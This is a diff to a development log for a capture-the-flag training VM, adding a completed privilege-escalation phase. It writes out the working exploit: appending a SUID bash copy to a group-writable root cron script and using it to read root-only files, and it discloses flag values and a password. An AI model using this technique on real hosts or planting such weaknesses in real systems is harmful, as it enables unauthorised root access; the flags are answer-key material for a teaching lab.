@@ -42,7 +42,7 @@ application works (there is no application yet).
 - [x] Phase 2 — Application (Flask app, seeded users, IDOR, admin command injection, tests) — verified below
 - [x] Phase 3 — Linux identity & admin function (VM build) — verified below
 - [x] Phase 4 — Flags & story (15 flags, encryption, manifest) — verified below
-- [ ] Phase 5 — Privilege escalation
+- [x] Phase 5 — Privilege escalation — verified below
 - [ ] Phase 6 — Documentation (player + instructor)
 - [ ] Phase 7 — Integration testing
 - [ ] Phase 8 — Packaging
@@ -220,6 +220,51 @@ the final-artifact decrypt above was performed via instructor `sudo`,
 not by a player actually escalating from `admin` to `root`. Player and
 instructor docs updated to match the real implementation, but Stage 5's
 hint-sheet entries are still placeholders pending Phase 5.
+
+## Phase 5 — Privilege escalation (DONE, verified)
+
+Mechanism: `/etc/cron.d/admin-tools-cleanup` runs
+`/opt/admin-tools/cleanup.sh` as root every minute; the script is
+`root:admin` mode `664` — group-writable, and Linux `admin`'s primary
+group is `admin`. One single, deliberate weakness (Section 12) — no
+sudo rights for `admin` at all, no other SUID/cron shortcuts. Full
+rationale in `instructor-material/privesc-design.md`. Added by
+`vm/scripts/remote-provision.sh`; reset by the new
+`vm/scripts/reset-privesc.sh`.
+
+**Live, genuine exploitation performed as `admin`, with zero instructor
+`sudo` involvement** (not simulated):
+```
+sudo -u admin bash -c 'echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> /opt/admin-tools/cleanup.sh'
+# waited for the real cron tick (next minute, observed via polling)
+sudo -u admin bash -c '/tmp/rootbash -p -c "id"'
+# -> uid=1002(admin) gid=110(admin) euid=0(root) groups=110(admin)
+sudo -u admin bash -c '/tmp/rootbash -p -c "cat /root/root_note.txt; python3 /opt/tools/flagcrypto.py decrypt \"SYN{git_ghost_61ace7b2}\" /root/final_evidence.enc -"'
+# -> SYN{root_of_all_evidence_3b7d55a0}   (Original Flag 5, 250 pts)
+```
+This is the full, real Section 13 progression (steps 7–13) completed
+end to end on the live VM: enumerate → exploit the cron weakness →
+become root → read the root-only artifact → unlock it with Flag 3's
+plaintext → recover Flag 5.
+
+**Reset tested and verified:** re-exploited to leave an artifact
+(`/tmp/leftover_test_marker`, created by the real cron tick), ran
+`./scripts/reset-privesc.sh`, confirmed `cleanup.sh` restored to clean
+content/permissions (`664 root:admin`) and no leftover SUID shell.
+(The arbitrarily-named test marker itself, being outside the script's
+intentionally bounded cleanup patterns, was removed by hand — by
+design, this reset script never does a blanket `/tmp` wipe.)
+
+**Boundary checks confirmed on the live VM:**
+- `admin` has no sudo rights at all (`sudo -n -l` → "a password is
+  required", no NOPASSWD entries).
+- `find / -perm -4000` shows only the base Ubuntu image's standard SUID
+  binaries — no leftover escalation artifacts after reset.
+- `/etc/cron.d/admin-tools-cleanup` itself is not writable by `admin`
+  (only the script it invokes is).
+- Original Flag 3's password (`BlueHarbor-99`) is confirmed distinct
+  from any Linux account password, and from the final artifact's
+  password (Flag 3's *decrypted value*, `SYN{git_ghost_61ace7b2}`).
 
 ## Outstanding items requiring the project owner
 
